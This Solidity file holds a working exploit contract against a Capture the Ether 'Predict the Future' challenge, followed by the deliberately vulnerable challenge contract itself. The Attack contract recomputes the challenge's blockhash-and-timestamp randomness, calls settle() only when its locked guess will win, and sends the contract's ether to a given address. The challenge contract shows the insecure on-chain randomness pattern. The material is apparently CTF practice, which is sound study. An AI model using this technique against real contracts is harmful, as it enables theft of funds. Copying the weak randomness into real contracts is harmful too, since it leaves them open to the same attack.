pragma solidity ^0.4.21;

contract Attack {
    PredictTheFutureChallenge victim = PredictTheFutureChallenge(0x729313a5D98cA52185C49495eC8897B9aFca8778);

//     constructor() {
// //0xa56a94E48F4cb12255cf6e932951FCfe5B840fFE
//     }
    // uint8 public curiosity;
    function attack() public {
        // curiosity = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        // curiosity = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        require(uint8(keccak256(block.blockhash(block.number - 1), now)) % 10 == 1);
        victim.settle();
    }
    
    function lockGuess(uint n) public payable {
        victim.lockInGuess.value(msg.value)(uint8(n));
    }

    function withdraw(address to) {
        to.transfer(address(this).balance);
    }

    function receive() payable external {}
    function fallback() payable external {}
    function() public payable { }
}

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}